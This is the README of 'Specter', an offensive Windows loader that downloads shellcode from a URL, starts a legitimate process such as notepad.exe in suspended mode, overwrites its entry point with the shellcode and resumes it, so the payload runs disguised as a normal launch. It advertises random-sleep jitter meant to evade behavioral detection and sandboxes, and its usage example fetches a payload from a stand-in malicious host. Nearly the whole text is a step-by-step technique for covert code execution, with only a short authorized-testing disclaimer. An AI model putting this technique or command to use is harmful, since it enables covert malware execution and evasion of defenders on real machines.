# Specter

_Specter_ is a stealthy entry point stomping shellcode loader for Windows. By overwriting the entry point of a newly created, suspended process, Specter enables covert execution of arbitrary shellcode directly at process startup.

## Features

- **Entry Point Stomping:**  
  Overwrites the entry point of the target process with downloaded shellcode, making execution blend seamlessly with legitimate process launch.

- **Dynamic Shellcode Download:**  
  Fetches shellcode on-the-fly from a specified HTTP(S) URL.

- **PEB & NT Headers Parsing:**  
  Locates the entry point of the target process using native structures for precise patching.

- **Jitter Function:**  
  Adds random sleep intervals to evade simple behavioral detection and slow automated sandboxes.

- **Minimal & Portable:**  
  Pure C with minimal dependencies; no extra libraries beyond Windows API and WinINet.

## How It Works

1. **Download Shellcode:**  
   Specter grabs shellcode from a user-provided URL using WinINet.

2. **Create Suspended Process:**  
   A legitimate process (e.g., `notepad.exe`) is launched in suspended mode.

3. **Discover Entry Point:**  
   The code reads the Process Environment Block (PEB) to find the base image address, then parses the PE headers to locate the entry point.

4. **Overwrite Entry Point:**  
   The shellcode is written directly to the entry point, replacing the original instructions.

5. **Resume Execution:**  
   The process is resumed; execution begins at the shellcode, masquerading as normal process startup.

## Usage

```bash
Specter.exe <process_path> <shellcode_url>
```

- `<process_path>`: Full path to the target executable (e.g., `C:\Windows\System32\notepad.exe`)
- `<shellcode_url>`: Direct HTTP(S) URL pointing to the raw shellcode payload

**Example:**
```bash
Specter.exe C:\Windows\System32\notepad.exe http://shellcode.mal/shellcode.bin
```

## Code Highlights

- **Entry Point Stomping:**  
  Uses native Windows structures to identify and overwrite the real process entry point.

- **Anti-Analysis:**  
  Random jitter via the `Jitter()` function introduces unpredictable delays.

- **WinINet Download:**  
  Remote shellcode is fetched in-memory, supporting dynamic payload delivery.

## Requirements

- Windows (x64 recommended)
- Visual Studio or MinGW for compilation
- Network access for payload download

## Disclaimer

This project is provided for educational and authorized testing purposes only.  
**Do not use Specter on systems without explicit permission. Unauthorized use is illegal and unethical.**

## License

[MIT License](LICENSE)

---

**Specter** — Haunt the entry point.
